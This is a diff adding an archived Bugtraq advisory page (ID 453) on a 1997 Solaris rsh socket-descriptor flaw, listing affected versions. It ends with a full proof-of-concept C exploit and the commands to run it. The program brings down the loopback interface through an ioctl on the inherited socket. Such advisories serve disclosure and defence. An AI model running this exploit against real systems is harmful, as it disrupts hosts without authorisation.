@@ -1,0 +1,118 @@
+#bid453<p><b><span style="font-size: 18pt;">Solaris rsh socket descriptor Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/453/info">info</a><br><a href="http://www.securityfocus.com/bid/453/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/453/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/453/solution">solution</a><br><a href="http://www.securityfocus.com/bid/453/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				453
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 19 1997 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 19 1997 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by Alan Cox &lt;alan@LXORGUK.UKUU.ORG.UK&gt; on June 19, 1997.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Sun Solaris 2.5.1 _x86<br/>
+					
+				
+					Sun Solaris 2.5.1 <br/>
+					
+				
+					Sun Solaris  2.5_x86<br/>
+					
+				
+					Sun Solaris  2.5<br/>
+					
+				
+					Sun Solaris  2.4_x86<br/>
+					
+				
+					Sun Solaris  2.4<br/>
+					
+				
+					Sun Solaris  2.3<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Sun Solaris  2.6_x86<br/>
+					
+				
+					Sun Solaris  2.6<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	        cc solarisuck.c -o solarisuck -lsocket<br/>        rsh localhost ./solarisuck<br/><br/>        ------------<br/>        solarisuck.c<br/>        ------------<br/>        #include &lt;stdio.h&gt;<br/>        #include &lt;sys/types.h&gt;<br/>        #include &lt;sys/socket.h&gt;<br/>        #include &lt;sys/sockio.h&gt;<br/>        #include &lt;net/if.h&gt;<br/>        #include &lt;netinet/in.h&gt;<br/><br/><br/>        int main(int argc, char *argv)<br/>        {<br/>                struct ifreq please_break_me;<br/><br/>                strcpy( please_break_me.ifr_name, "lo0");<br/>                please_break_me.ifr_flags=0;<br/><br/>                if(ioctl(0, SIOCSIFFLAGS, &amp;please_break_me)==-1)<br/>                        perror("Damn it didnt work. Obviously not Solaris ;)");<br/>        }
+	
+		<ul>
+</ul>
+</div>
